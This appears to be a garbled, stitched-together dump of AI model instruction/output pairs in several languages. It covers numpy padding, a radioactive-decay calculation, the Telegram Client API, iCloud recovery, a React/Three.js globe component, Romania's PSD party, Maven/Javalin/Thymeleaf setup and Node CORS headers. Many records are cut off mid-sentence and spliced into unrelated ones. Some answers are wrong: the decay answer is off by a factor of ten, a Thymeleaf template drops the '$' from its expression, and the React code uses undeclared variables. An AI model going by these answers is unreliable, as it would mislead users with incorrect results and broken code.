superiore in \`range\` in Python è esclusivo. Ad esempio, se \`months_np\` contiene 28 elementi (come sarebbe per febbraio in un anno non bisestile), \`len(months_np)\` sarebbe pari a 28, e quindi il range sarebbe \`(28, 29, 30)\`. Quindi il ciclo \`for\` eseguirebbe tre iterazioni. Il valore \`-1\` usato all'interno di \`np.append()\` è un valore arbitratio scelto per riempire il resto dell'array fino a quando non raggiunge una lunghezza di 31. Quindi nel nostro esempio, dato che febbraio ha 28 giorni, \`-1\` viene aggiunto tre volte per arrivare a 31, cioè aggiungendo dei valori di riempimento o \\"padding\\" alla fine dell'array originale. Ecco come apparirebbe l'operazione: \`\`\`python # Supponendo che months_np inizi con 28 giorni months_np = [dato_giorno_1, dato_giorno_2, ..., dato_giorno_28] # Dopo l'esecuzione del ciclo for months_np = [dato_giorno_1, dato_giorno_2, ..., dato_giorno_28, -1, -1, -1] \`\`\` Adesso \`months_np\` ha una lunghezza di 31, che è standardizzata per tutti i mesi, indipendentemente da quanti giorni abbiano originalmente. Utilizzare \`-1\` per il padding può essere utile perché è un valore che tipicamente non si troverebbe in un dataset reale e può essere facilmente riconosciuto come un valore speciale o mancante quando si visualizza la heatmap."},{"instruction":"un campione radioattivo ha vita media 157 minuti è un’attività iniziale 34 MBq. calcola il numero di nuclei presenti nel campopne","output":"Per trovare il numero di nuclei presenti in un campione radioattivo, possiamo utilizzare la relazione tra l'attività di una sostanza e il numero di nuclei presenti che si sta disintegrando. L'attività, A, è definita come il numero di disintegrazioni che avvengono per unità di tempo e può essere espressa dall'equazione: [ A = lambda N ] dove: - ( A ) è l'attività del campione (in questo caso, 34 MBq) - ( lambda ) è la costante di decadimento, correlata alla vita media (( tau )) dalla relazione ( lambda = frac{1}{tau} ) - ( N ) è il numero di nuclei presenti nel campione Calcoliamo prima di tutto la costante di decadimento ( lambda ) usando la vita media data ( tau = 157 ) minuti. Dobbiamo però ricordarci di convertire tutto nella stessa unità di tempo. Quindi: [ lambda = frac{1}{tau} = frac{1}{157 text{ minuti}} ] L'attività è data in Becquerel (Bq), che corrisponde a una disintegrazione al secondo. Dal momento che 1 MBq = ( 10^6 ) Bq, l'attività iniziale del campione di 34 MBq equivale a ( 34 times 10^6 ) Bq. Ora convertiamo la vita media in secondi, dato che ci serviranno le unità coerenti per trovare il numero di nuclei: [ tau = 157 text{ minuti} times 60 text{ secondi/minuto} = 9420 text{ secondi} ] Ora possiamo trovare la costante di decadimento ( lambda ): [ lambda = frac{1}{9420 text{ secondi}} approx 1.0616 times 10^{-4} text{ secondi}^{-1} ] Usando i valori trovati per ( A ) e ( lambda ), possiamo risolvere per ( N ): [ A = lambda N ] [ N = frac{A}{lambda} = frac{34 times 10^6 text{ Bq}}{1.0616 times 10^{-4} text{ secondi}^{-1}} approx frac{34 times 10^6}{1.0616 times 10^{-4}} ] Calcoliamo il valore approssimativo di ( N ): [ N approx frac{34 times 10^6}{1.0616 times 10^{-4}} approx 3.2 times 10^{10} ] Quindi, il numero approssimativo di nuclei presenti nel campione radioattivo è di circa ( 3.2 times 10^{10} ) nuclei."},{"instruction":"(In the main Azur Lane base…) Enterprise: “Nice to see all the nations getting along, huh?” Belfast: “Indeed, Lady Enterprise.

Если вам нужны такие данные, вам может потребоваться воспользоваться Telegram Client API с использованием библиотеки, такой как \`Telethon\` или \`Pyrogram\`, которые работают на основе MTProto протокола Telegram и позволяют взаимодействовать с Telegram на более глубоком уровне, чем Bot API. Будьте внимательны, что использование Client API может нарушать условия использования Telegram и потребует использования реального аккаунта (не бота), а также это связано с дополнительной ответственностью по обработке данных пользователей."},{"instruction":"Je n'arrive pas à me souvenir de mon identifiant icloud donc pourrais-tu me dire qu'est-ce que je peux faire pour utiliser à nouveau mon iPhone","output":"Si vous avez oublié votre identifiant iCloud, qui est généralement votre adresse e-mail, vous pouvez essayer les étapes suivantes pour le récupérer et continuer à utiliser votre iPhone: 1.

The rest of your imports const GlobeComponent = ({ /*...props*/ }) => { const containerRef = useRef(); const { globeState, setGlobeState } = useContext(GlobeContext); useEffect(() => { if (!globeState.initialized) { // Init Three.js resources if not yet initialized // ... } // Mounted // ... return () => { // Unmounted // Perform cleanup that is non-destructive to global Three.js state }; }, [globeState]); return <div ref={containerRef} />; }; const GlobeComponentWithProvider = (props) => ( <GlobeProvider> <GlobeComponent {...props} /> </GlobeProvider> ); export default GlobeComponentWithProvider; \`\`\` The \`GlobeProvider\` wraps \`GlobeComponent\`, ensuring that the state is preserved across remounts of the component. Inside \`GlobeComponent\`, you conditionally initialize Three.js resources based on whether they have been previously initialized or not (\`globeState.initialized\`). Additionally, this change implies that your app should not have multiple instances of \`GlobeProvider\`. Ideally, the \`GlobeProvider\` should be placed at a higher level in your component hierarchy, perhaps around the entire part of your application that might unmount and remount the GlobeComponent. Make sure to adapt the above example to fit your specific context needs, such as managing your scene elements, the animation loop, and event handlers.

First, let's set up the \`GlobeContext\` and its provider: \`\`\`jsx // GlobeContext.js import React, { createContext, useState, useEffect } from 'react'; import { WebGLRenderer, Scene, PerspectiveCamera } from 'three'; import { OrbitControls } from 'three/examples/jsm/controls/OrbitControls.js'; import ThreeGlobe from 'three-globe'; export const GlobeContext = createContext(null); export const GlobeProvider = ({ children }) => { const [globeResources, setGlobeResources] = useState({ renderer: null, scene: null, camera: null, controls: null, globe: null, timeoutId: null, }); useEffect(() => { // Initialize the core Three.js elements const renderer = new WebGLRenderer({ antialias: true, alpha: true }); const scene = new Scene(); const camera = new PerspectiveCamera(); const controls = new OrbitControls(camera, renderer.domElement); const globe = new ThreeGlobe({/* ...initial properties for globe... */}); // ... other properties like lights, fog, etc. setGlobeResources({ renderer, scene, camera, controls, globe, timeoutId: null, // To be set when initiating arcs animation }); return () => { // Clean up the resources renderer.dispose(); controls.dispose(); // ... Additional cleanup logic }; }, []); return ( <GlobeContext.Provider value={globeResources}> {children} </GlobeContext.Provider> ); }; \`\`\` Now, let's use this context in the \`GlobeComponent\`: \`\`\`jsx // GlobeComponent.jsx import React, { useContext, useEffect, useRef } from 'react'; import { GlobeContext } from './GlobeContext'; // ... the rest of your imports const GlobeComponent = ({ globeWidth, globeHeight, windowWidth, windowHeight }) => { const containerRef = useRef(); const { renderer, scene, camera, controls, globe, timeoutId, setGlobeResources, } = useContext(GlobeContext); // ... Event listeners and other functions like onWindowResize, and onMouseMove useEffect(() => { if (!renderer || !scene || !camera || !controls || !globe) return; // Initialize Three.js resources that depend on the DOM or need to be reset renderer.setSize(globeWidth, globeHeight); // ... other properties camera.aspect = globeWidth / globeHeight; camera.updateProjectionMatrix(); // ... other camera properties controls.update(); // required if controls.enableDamping or controls.autoRotate are set to true // Append renderer to the container containerRef.current.appendChild(renderer.domElement); // Set up and start the animation loop const animate = () => { // Animation loop code requestAnimationFrame(animate); }; animate(); return () => { // Clean up event listeners and cancel animation frame // ... }; }, [renderer, scene, camera, controls, globe]); // ... Additional effects to handle window resize and mouse movement return <div ref={containerRef} />; }; export default GlobeComponent; \`\`\` Use the \`GlobeProvider\` to wrap your application or the \`GlobeComponent\` to ensure the context is provided: \`\`\`jsx // App.jsx or a higher-order component import React from 'react'; import { GlobeProvider } from './GlobeContext'; import GlobeComponent from './GlobeComponent'; const App = () => { return ( <GlobeProvider> {/* Your other application components */} <GlobeComponent globeWidth={/*...*/} globeHeight={/*...*/} windowWidth={/*...*/} windowHeight={/*...*/} /> {/* Your other application components */} </GlobeProvider> ); }; export default App; \`\`\` Note that in this setup: - The Three.js resources are managed in the \`GlobeContext\` and initialized in the \`GlobeProvider\`. - The \`GlobeComponent\` consumes the context and takes care of rendering the globe in the DOM, setting up event listeners, and doing cleanup. - The \`GlobeProvider\` is used at the application level to ensure that the context (with the Three.js resources) is available to any components that need it. This context-based approach gives you a nice separation of concerns, keeping your resource management logic separate and making your components simpler and more focused on rendering. However, whenever working with a context and Three.js, you must carefully manage the resources to prevent memory leaks and ensure proper cleanup."},{"instruction":"Fill in the commented truncated section","output":"Below you'll find the context initialization and consumption in the \`GlobeContext.js\` and \`GlobeComponent.jsx\` files, with the truncated sections filled in. **GlobeContext.js** \`\`\`jsx // GlobeContext.js import React, { createContext, useState, useEffect } from 'react'; import { WebGLRenderer, Scene, PerspectiveCamera, AmbientLight, PointLight, DirectionalLight, Color, Fog } from 'three'; import { OrbitControls } from 'three/examples/jsm/controls/OrbitControls.js'; import ThreeGlobe from 'three-globe'; import countries from './files/globe-data-min.json'; import travelHistory from './files/my-flights.json'; import airportHistory from './files/my-airports.json'; export const GlobeContext = createContext(null); export const GlobeProvider = ({ children }) => { const [globeResources, setGlobeResources] = useState({ renderer: null, scene: null, camera: null, controls: null, globe: null, timeoutId: null, }); useEffect(() => { // Initialize the core Three.js elements const renderer = new WebGLRenderer({ antialias: true, alpha: true }); const scene = new Scene(); const camera = new PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000); const controls = new OrbitControls(camera, renderer.domElement); // Set up the lighting const ambientLight = new AmbientLight(0xbbbbbb, 0.3); scene.add(ambientLight); const directionalLight = new DirectionalLight(0xffffff, 0.8); directionalLight.position.set(-800, 2000, 400); camera.add(directionalLight); const pointLight = new PointLight(0x8566cc, 0.5); pointLight.position.set(-200, 500, 200); camera.add(pointLight); // Set up the camera position camera.position.z = 400; // Set the fog for the scene if necessary scene.fog = new Fog(0x535ef3, 400, 2000); // Set up controls // ...

Additionally, you would define and initiate arcs, labels, and points for the globe using the globe instance that we have stored in the context. Please adjust the provided code as per your requirement. You'll need to properly integrate your globe initialization code to follow best practices for React components and Three.js resource management."},{"instruction":"how will this implementation ensure the arcs are shown upon returning to the page using fast refresh","output":"The implementation provided does not ensure that the arcs will show upon returning to the page using fast refresh without including additional logic related to the arc animation state. Fast refresh is a Next.js feature that allows for quick feedback during development by reloading parts of the UI without losing the application state. To ensure that the arcs are shown when you return to the page using fast refresh, you need to handle the reinitialization of the arcs within the React component lifecycle methods properly. A typical mistake is to assume the component will be totally remounted, but fast refresh may preserve some state, which could lead to unexpected behavior if not managed correctly. Here's how to modify \`GlobeComponent\` to ensure that the arcs are reinitialized correctly upon returning to the page with fast refresh: \`\`\`jsx // GlobeComponent.jsx import React, { useContext, useEffect, useRef, useCallback } from 'react'; import { GlobeContext } from './GlobeContext'; // ...the rest of your imports const GlobeComponent = ({ globeWidth, globeHeight, windowWidth, windowHeight }) => { const containerRef = useRef(); const { renderer, scene, camera, controls, globe, timeoutId, setGlobeResources } = useContext(GlobeContext); // Event listeners and other functions like onWindowResize, onMouseMove, etc. // Function to initialize arcs - make sure it's wrapped with useCallback // to ensure a stable reference if needed by dependencies const initializeArcs = useCallback(() => { // Cancel any previously scheduled animation setups if (timeoutId) clearTimeout(timeoutId); const newTimeoutId = setTimeout(() => { globe .arcsData(travelHistory.flights) .arcColor((e) => e.status ? \\"#9cff00\\" : \\"#ff2e97\\") .arcAltitude((e) => e.arcAlt) .arcStroke((e) => e.status ? 0.5 : 0.3) // ... other properties and method calls related to arc animation // Trigger re-render globe.refresh(); }, 1000); // Update the context with the new timeoutId to ensure cleanup setGlobeResources((prevResources) => ({ ...prevResources, timeoutId: newTimeoutId })); }, [globe, setGlobeResources, timeoutId]); useEffect(() => { if (!renderer || !scene || !camera || !controls || !globe) return; // Append renderer to the container containerRef.current.appendChild(renderer.domElement); // Start the animation loop animate(); // Initialize arcs upon mounting and fast refreshes initializeArcs(); return () => { // Clean up event listeners, cancel animation frame, and clear timeouts // ... }; }, [renderer, scene, camera, controls, globe, initializeArcs]); // Start the animation loop const animate = useCallback(() => { if (!frameId) { // This inner function will be called recursively const loop = () => { frameId = requestAnimationFrame(loop); controls.update(); renderer.render(scene, camera); }; loop(); } }, [camera, controls, renderer, scene]); useEffect(() => { // Cleanup code, invoked when the component unmounts return () => { if (frameId) { cancelAnimationFrame(frameId); frameId = null; } }; }, []); // Additional effects to handle window resize, mouse movement, and other interactivity // ... return <div ref={containerRef} />; }; export default GlobeComponent; \`\`\` In this code: 1. A new function \`initializeArcs\` wrapped with \`useCallback\` is used to reset the arc animations each time the component mounts, ensuring consistency after fast refresh. 2. A new \`useEffect\` hook is introduced to start the animation loop. It will call \`initializeArcs\` when the component mounts. Thanks to the \`useCallback\` hook, the reference to \`initializeArcs\` will only change if its dependencies change. The component will now reinitialize the arcs upon each mounting. Since Next.js's fast refresh may preserve some React state between reloads, the \`initializeArcs\` function should be idempotent. It should check if arcs already exist or are in the correct state before attempting to add them again to avoid duplication or conflicts. In the example above, the arcs are set up each time the \`initializeArcs\` function is called, but your own logic might need to check for existing arcs first. Finally, bind the \`initializeArcs\` and \`animate\` functions in the \`useEffect\` hooks to ensure they are executed correctly upon component mount and to handle cleanup upon unmounting. This ensures that when the component is re-rendered due to fast refresh, all resources are appropriately managed to display the arcs correctly."},{"instruction":"Show me how to account for fast refresh in the following implementation of GlobeComponent: import React, { useEffect, useRef } from 'react'; import { WebGLRenderer, Scene, AmbientLight, DirectionalLight, Color, Fog, PerspectiveCamera, PointLight } from 'three'; import { OrbitControls } from 'three/examples/jsm/controls/OrbitControls.js'; import { createGlowMesh } from 'three-glow-mesh'; import ThreeGlobe from \\"three-globe\\"; import countries from './files/globe-data-min.json'; import travelHistory from './files/my-flights.json'; import airportHistory from './files/my-airports.json'; let mouseX = 0; let mouseY = 0; let timeoutId; let renderer, camera, scene, controls; let Globe; let frameId; const GlobeComponent = ({ globeWidth, globeHeight, windowWidth, windowHeight, uniqueValue }) => { const containerRef = useRef(); let windowHalfX = windowWidth / 2; let windowHalfY = windowHeight / 2; // Event listeners function onWindowResize() { camera.aspect = windowWidth / windowHeight; camera.updateProjectionMatrix(); windowHalfX = windowWidth; windowHalfY = windowHeight; renderer.setSize(windowWidth, windowHeight); } function onMouseMove(event) { mouseX = event.clientX - windowHalfX; mouseY = event.clientY - windowHalfY; // console.log(\\"x: \\" + mouseX + \\" y: \\" + mouseY); } // Animation function animate() { camera.lookAt(scene.position); controls.update(); renderer.render(scene, camera); frameId = requestAnimationFrame(animate); } useEffect(() => { // Initialize core ThreeJS elements function init() { // Initialize renderer renderer = new WebGLRenderer({ antialias: true, alpha: true }); renderer.setPixelRatio(window.devicePixelRatio); renderer.setSize(globeWidth, globeHeight); renderer.setClearColor(0x000000, 0); containerRef.current.appendChild(renderer.domElement); // Initialize scene, light scene = new Scene(); scene.add(new AmbientLight(0xbbbbbb, 0.4)); // Initialize camera, light camera = new PerspectiveCamera(); camera.aspect = globeWidth / globeHeight; camera.updateProjectionMatrix(); var dLight = new DirectionalLight(0xffffff, 0.8); dLight.position.set(-800, 2000, 400); camera.add(dLight); var dLight1 = new DirectionalLight(0x7982f6, 1); dLight1.position.set(-200, 500, 200); camera.add(dLight1); var dLight2 = new PointLight(0x8566cc, 0.5); dLight2.position.set(-200, 500, 200); camera.add(dLight2); camera.position.z = 400; camera.position.x = 0; camera.position.y = 0; scene.add(camera); // Additional effects scene.fog = new Fog(0x535ef3, 400, 2000); // Helpers // const axesHelper = new THREE.AxesHelper(800); // scene.add(axesHelper); // var helper = new THREE.DirectionalLightHelper(dLight); // scene.add(helper); // var helperCamera = new THREE.CameraHelper(dLight.shadow.camera); // scene.add(helperCamera); // Initialize controls controls = new OrbitControls(camera, renderer.domElement); controls.enableDamping = true; controls.dynamicDampingFactor = 0.01; controls.enablePan = false; controls.minDistance = Math.min(globeWidth, globeHeight) / 2; controls.maxDistance = Math.min(globeWidth, globeHeight) / 2; controls.rotateSpeed = 0.8; controls.zoomSpeed = 1; controls.autoRotate = false; controls.minPolarAngle = Math.PI / 3.5; controls.maxPolarAngle = Math.PI - Math.PI / 3; } // Initialize the Globe function initGlobe() { // Initialize the Globe Globe = new ThreeGlobe({ waitForGlobeReady: true, animateIn: true, }) .hexPolygonsData(countries.features) .hexPolygonResolution(3) .hexPolygonMargin(0.7) .showAtmosphere(true) .atmosphereColor(\\"#ffffff\\") .atmosphereAltitude(0.1) .hexPolygonColor((e) => { if ( [\\"KEN\\", \\"CHN\\", \\"FRA\\", \\"ZAF\\", \\"JPN\\", \\"USA\\", \\"AUS\\", \\"CAN\\"].includes( e.properties.ISO_A3 ) ) { return \\"rgba(255,255,255, 1)\\"; } else return \\"rgba(255,255,255, 0.5)\\"; }); // NOTE Arc animations are followed after the globe enters the scene timeoutId = setTimeout(() => { Globe.arcsData(travelHistory.flights) .arcColor((e) => { return e.status ?

This approach helps to manage the resources in the Three.js scene during fast refresh and ensures that the scene is initialized in a clean state whenever \`uniqueValue\` updates.

The \`initArcs\` function is called within a \`useEffect\` hook that watches the \`isGlobeReady\` state. When \`isGlobeReady\` turns \`true\`, the globe's arcs and associated data are initialized. This effectively replaces the need for \`setTimeout\` by directly tying the initiation of the arcs to the readiness state of the globe, which is a more deterministic way to manage the lifecycle. Please adjust the \`initArcs\` function and the \`isGlobeReady\` state mechanism to match the actual way that \`ThreeGlobe\` signals its readiness. If \`ThreeGlobe\` doesn't provide such an event or method, you might need an alternative approach, such as checking if certain properties or methods exist or setting a flag after initial setup."},{"instruction":"(In the main Azur Lane base…) Enterprise: “Nice to see all the nations getting along, huh?” Belfast: “Indeed, Lady Enterprise.

Founded in its current form in 2001 after a merger of the Party of Social Democracy in Romania with the Romanian Social Democratic Party, PSD is one of the major political forces in the country and has frequently been part of the governing coalitions. The political ideology of PSD typically includes: 1. **Commitment to Social Justice**: The PSD advocates for policies that promote social equity, aiming to reduce economic inequality and provide a safety net for the most vulnerable citizens. 2. **Economic Intervention**: While not opposed to market economies, the PSD supports the idea that the state should play a significant role in regulating the economy, with policies that may involve strategic nationalization, progressive taxation, and welfare state measures. 3. **Workers' Rights**: The party traditionally supports strong labor rights and protections, collective bargaining, and a decent minimum wage. 4. **Public Services**: PSD usually emphasizes the importance of robust public services, including health care and education, and often opposes extensive privatization in these sectors. 5. **Pro-European Union Stance**: The PSD generally supports Romania's membership in the European Union and strives to align its policies with EU directives and regulations, although the degree of this alignment can vary depending on the party's leadership and the political context. 6. **Social Progressivism**: On social issues, the PSD has sometimes taken progressive stances, although there is variation within the party. This can include support for minority rights, gender equality, and, more recently, some LGBTQ+ rights, although this progressivism can be inconsistent. 7. **National Sovereignty and Independence**: While the PSD is generally pro-Europe, it also often emphasizes Romanian national sovereignty and strategic interests, balancing these with its commitment to international cooperation. Political parties and their ideologies can evolve over time, and PSD is no exception. The party's stance on specific issues and policies can change depending on its leadership, factional dynamics, the political climate, and public opinion. Moreover, like many social democratic parties across Europe, PSD has faced challenges in recent years due to the rise of populism, economic crises, and shifts in the political landscape. As of my knowledge cutoff date in 2023, these broad strokes represent the general ideology of PSD, but for the most up-to-date and detailed information about the party's current position and policy proposals, it would be best to refer to the party's official communications, recent electoral platforms, and statements from its leadership."},{"instruction":"As a prompt generator for a generative AI called \\"Midjourney\\", you will create image prompts for the AI to visualize.

How do I use maven on the command line to build and run my java project?","output":"To build and run your Java project using Maven, you can follow the steps below. Assuming you already have Java and Maven installed on your system, here is what you need to do: 1. **Navigate to your project directory:** Open a terminal or command prompt and change to the directory where your \`pom.xml\` file is located. Use the \`cd\` command to navigate to your project directory, for example: \`\`\` cd path/to/your/project \`\`\` 2. **Build your project:** You can compile and package your project using the Maven compile and package commands. This will download the dependencies defined in your \`pom.xml\` file (including Javalin) and build your project. \`\`\` mvn clean package \`\`\` The \`clean\` command will clean your project by deleting the \`target\` directory. The \`package\` command will compile your code and package it into a JAR or a WAR file (depending on your project setup) within the \`target\` directory. 3. **Run your project:** If your project has a main class defined, and that main class is properly set up to start your Javalin application, you can run the application directly either by using \`java\` command or the Maven \`exec\` plugin. - **Using java command:** \`\`\` java -cp target/your-artifact-name-VERSION.jar your.package.MainClass \`\`\` Replace \`your-artifact-name-VERSION.jar\` with the actual name of your JAR file generated by Maven, and \`your.package.MainClass\` with the fully-qualified name of your main class that starts the Javalin server. - **Using Maven exec plugin:** If you have configured the Maven exec plugin in your \`pom.xml\`, you can run the application with the following command: \`\`\` mvn exec:java -Dexec.mainClass=\\"your.package.MainClass\\" \`\`\` Make sure to replace \`your.package.MainClass\` with the fully-qualified name of your main class. Note that if you're using additional parameters like system properties, you will need to pass them to the JVM or configure them in your Maven \`pom.xml\` or Maven exec plugin configuration. If your application is packaged as a fat JAR with all its dependencies included by using plugins like \`maven-assembly-plugin\` or \`maven-shade-plugin\`, you can run it with the following command which is similar to the regular Java command: \`\`\` java -jar target/your-artifact-name-VERSION.jar \`\`\` Remember to replace placeholders with actual values specific to your project (artifact name, version, main class package and name). Once you run the application, the Javalin server will start, and you should see output in the terminal indicating that the server is up and running."},{"instruction":"I tried running my application through the java command as you suggested, but it says that it cannot find the Javalin class. How do I fix this?","output":"If Java can't find the Javalin class, it usually means that the classpath is not set correctly, or the JAR file with Javalin's classes isn't added to the classpath when running your application.

What am I doing wrong?","output":"If Maven is reporting that the class \`org.eol.Server\` cannot be found when you try to run your application with \`mvn exec:java\`, it could be due to a few reasons. Ensure that you have the correct configuration and that your project's structure is following the Maven standard layout. Here are some checks and potential solutions: 1. **Check your project structure:** Make sure that your project follows the Maven standard directory layout. The \`Server.java\` file should be located at: \`\`\` src/main/java/org/eol/Server.java \`\`\` This corresponds to the package \`org.eol\` and the class \`Server\` in your Java code. 2. **Build the project:** Make sure to compile and install your project before attempting to run it. This ensures that all the classes are compiled and up-to-date: \`\`\` mvn clean install \`\`\` If there are any compilation errors, Maven will not be able to find your class. Address any compilation issues before trying to run the application. 3. **Correct the \`exec-maven-plugin\` configuration:** Verify the \`exec-maven-plugin\` configuration within your \`pom.xml\`. The \`mainClass\` should be set to the fully qualified name of your main class: \`\`\`xml <plugin> <groupId>org.codehaus.mojo</groupId> <artifactId>exec-maven-plugin</artifactId> <version>3.0.0</version> <!-- Use the latest version available --> <configuration> <mainClass>org.eol.Server</mainClass> </configuration> </plugin> \`\`\` Replace the \`version\` tag with the latest version of \`exec-maven-plugin\` if necessary. 4. **Run with classpath scope:** Sometimes, dependencies may not be included on the classpath when you run the \`mvn exec:java\` command. You can explicitly specify the classpath scope by using the following configuration: \`\`\`xml <configuration> <classpathScope>compile</classpathScope> <mainClass>org.eol.Server</mainClass> </configuration> \`\`\` 5. **Check for typos:** Typos in the package name or class name could cause this error. Double-check the spelling of your class name and the package defined in the source code itself and that it matches the configuration in the \`pom.xml\`. 6. **Review the source code:** Open the \`Server.java\` file and ensure the package declaration at the top of the file exactly reads: \`\`\`java package org.eol; \`\`\` And that your class is defined as public with the proper main method signature: \`\`\`java public class Server { public static void main(String[] args) { // code to start the application } } \`\`\` 7. **Run from the correct location:** Start the Maven command \`mvn exec:java\` from the root directory of the project where the \`pom.xml\` is located.

Given the Maven standard directory layout: \`\`\` src/ ├── main/ │ ├── java/ │ └── resources/ └── test/ \`\`\` Let's say you create the following structure under resources: \`\`\` src/ ├── main/ │ ├── java/ │ └── resources/ │ └── templates/ │ └── mypage.html \`\`\` In this example, you've placed your HTML file (\`mypage.html\`) inside a \`templates\` directory within \`resources\`. Now, when you use \`Context.render\`, you would provide the path as \`\\"templates/mypage.html\\"\`. Here's how it would look in your Javalin handler code: \`\`\`java import io.javalin.http.Context; import io.javalin.http.Handler; import io.javalin.Javalin; public class MyApp { public static void main(String[] args) { Javalin app = Javalin.create(config -> { config.addStaticFiles(\\"/public\\"); // if you have static files in \\"src/main/resources/public\\" config.enableWebjars(); // if you want to use WebJars }).start(7070); app.get(\\"/my-page\\", ctx -> ctx.render(\\"templates/mypage.html\\")); } } \`\`\` When the application is compiled and packaged, the contents of \`src/main/resources\` are placed at the root of the classpath. When referring to these resources within your application, you would specify the path relative to the root of the classpath. If you are using the default template engine in Javalin (which is Javalin's integrated version of Jetty's \`DefaultServlet\` for static file handling), you don't need to add any additional template engine configuration. However, if you want to use other template engines supported by Javalin like Thymeleaf, Freemarker, or Velocity, you will need to configure Javalin to use the appropriate template engine, and potentially adjust the path accordingly. Remember that the \`render\` method is used to render templates and may require a suitable template engine to be configured if not using static HTML. If you are simply serving static HTML, you can also use \`staticFiles\` which is the preferred way for static content. Here's how you might do that: \`\`\`java Javalin app = Javalin.create(config -> { config.addStaticFiles(\\"/public\\"); }).start(7070); \`\`\` Now, any files under \`src/main/resources/public\` will be served as static files, accessible via the \`/\` endpoint (i.e., the root path of your server). If you place the HTML file directly under the \`public\` directory, you can access it directly with its filename in the URL."},{"instruction":"I want to use thymeleaf with the java web framework javalin. What do I need to do in my project to do this?","output":"To use Thymeleaf with Javalin, you need to set up the Thymeleaf template engine and configure it within your Javalin application. Here's a step-by-step guide to help you get started: 1. **Add Thymeleaf dependency:** First, add the Thymeleaf dependency to your \`pom.xml\` file: \`\`\`xml <dependencies> <!-- Other dependencies --> <!-- Add Thymeleaf dependency --> <dependency> <groupId>org.thymeleaf</groupId> <artifactId>thymeleaf</artifactId> <version>3.0.12.RELEASE</version> <!-- Use the latest version --> </dependency> </dependencies> \`\`\` 2. **Set up Thymeleaf template directory:** Create a directory in \`src/main/resources\` where you will place your Thymeleaf templates. The typical convention is to use \`templates\`: \`\`\` src/main/resources/templates/ \`\`\` Place your Thymeleaf templates (with \`.html\` file extension) in this directory. For example: \`\`\` src/main/resources/templates/my-template.html \`\`\` 3. **Configure Thymeleaf in your application:** In your main Javalin application file, set up the template engine during Javalin configuration. Create an instance of \`ThymeleafTemplateEngine\` and register it with Javalin: \`\`\`java import io.javalin.Javalin; import io.javalin.plugin.rendering.template.TemplateUtil; import io.javalin.plugin.rendering.template.JavalinThymeleaf; public class MyApp { public static void main(String[] args) { Javalin app = Javalin.create(config -> { // other configurations }).start(); // Configure Thymeleaf template engine with Javalin JavalinThymeleaf.configure( // Optionally configure Thymeleaf options here ); // Example endpoint that renders a Thymeleaf template app.get(\\"/thymeleaf-page\\", ctx -> { ctx.render(\\"my-template.html\\", TemplateUtil.model(\\"key\\", \\"value\\")); }); // more routes... } } \`\`\` In the example above, we have a route that renders \`my-template.html\`, which is a Thymeleaf template. You can pass parameters to your template using the \`TemplateUtil.model()\` method. 4. **Write your Thymeleaf template:** Inside your HTML templates, use Thymeleaf-specific syntax for dynamic content. Thymeleaf will process the templates when they are being served. An example template might look like this: \`\`\`html <!DOCTYPE html> <html xmlns:th=\\"http://www.thymeleaf.org\\"> <head> <title>Thymeleaf Example</title> </head> <body> <h1 th:text=\\"{key}\\"></h1> <!-- content --> </body> </html> \`\`\` This template will display the value passed to the key \`\\"key\\"\` in the model map from the route handler. 5. **Run and test:** Once you've set up Thymeleaf and created your endpoints and templates, run your Javalin application. Visit the defined route (e.g., \`http://localhost:7000/thymeleaf-page\`) in your web browser to see the rendered template with the passed model attributes. By following these steps, you've integrated Thymeleaf into your Javalin application, and you can now create dynamic web pages with Thymeleaf templates."},{"instruction":"I have a html file stored locally, and I want to fetch data from a server that is being hosted at localhost:8000. How do I do this?","output":"To fetch data from a server hosted at \`localhost:8000\` from a locally stored HTML file, you will typically use JavaScript to make an AJAX (Asynchronous JavaScript And XML) request. AJAX requests can be made with the native \`XMLHttpRequest\` object or with more modern APIs like \`fetch\`. Below is an example using \`fetch\`. First, ensure your server has appropriate CORS (Cross-Origin Resource Sharing) headers if your HTML file is being served from a different port or origin to avoid any potential Same-Origin Policy restrictions. If you have control over the server, you can set it to include the necessary CORS headers in its response. For a simple Javalin server, this would be something like: \`\`\`java import io.javalin.Javalin; public class Main { public static void main(String[] args) { Javalin app = Javalin.create(config -> { config.enableCorsForAllOrigins(); // Enable CORS for all origins }).start(8000); app.get(\\"/data\\", ctx -> { // ... handle the request and send response ctx.result(\\"This is some data from the server.\\"); }); // More routes... } } \`\`\` Next, here's an example of how you can use \`fetch\` in your HTML file to make a GET request to fetch data from the server running on \`localhost:8000\`. Include this script in your HTML: \`\`\`html <!DOCTYPE html> <html lang=\\"en\\"> <head> <meta charset=\\"UTF-8\\"> <title>Fetch Example</title> </head> <body> <h1>Data from the server:</h1> <div id=\\"data-container\\">Loading data...</div> <script> // Function to fetch data from server function fetchData() { fetch('http://localhost:8000/data') .then(response => response.text()) // convert the response to text .then(data => { // Display the data in the div with id 'data-container' document.getElementById('data-container').textContent = data; }) .catch(error => { // Handle any errors that occur during the fetch console.error('There was an error fetching the data:', error); }); } // Execute the function when the window loads window.onload = fetchData; <\/script> </body> </html> \`\`\` In this example, when the window loads, the \`fetchData\` function is called. The function makes a request to \`http://localhost:8000/data\`, where the server is expected to be running and listening for GET requests at the \`/data\` endpoint. Remember to open your HTML file using a local server rather than by double-clicking the HTML file directly. When files are opened directly from the file system (\`file://\` protocol), browsers typically restrict AJAX calls due to security measures. To overcome this, you can use a simple static file server. If you have Node.js installed, one easy way to do this is with the \`http-server\` package: \`\`\`bash npm install -g http-server http-server path/to/your/html/directory -p 8080 \`\`\` Then, visit \`http://localhost:8080\` in your browser to access your HTML file. If you're using an IDE like Visual Studio Code, you could also use the \\"Live Server\\" extension to serve your HTML file locally. Finally, ensure that your server is running and listening on port 8000, and that it includes CORS headers in the response if necessary, to allow for cross-origin requests from your HTML file's origin."},{"instruction":"How do I specify the cors header using the response object in a request handler for an http server in node?","output":"In Node.js, if you are using the \`http\` module to create an HTTP server, you can set the CORS headers directly on the \`response\` object within the request handler. Here's an example of how you can do it: \`\`\`javascript const http = require('http'); const server = http.createServer((req, res) => { // Set CORS headers res.setHeader('Access-Control-Allow-Origin', '*'); // Allow any origin res.setHeader('Access-Control-Allow-Methods', 'OPTIONS, GET, POST, PUT, PATCH, DELETE'); // Allowed methods res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization'); // Allowed headers // Handle preflight requests for CORS if (req.method === 'OPTIONS') { res.writeHead(204); // No Content res.end(); return; } // Rest of your request handling logic if (req.url === '/data' && req.method === 'GET') { res.writeHead(200, { 'Content-Type': 'application/json' }); res.end(JSON.stringify({ message: 'This is the response from your server.' })); } // 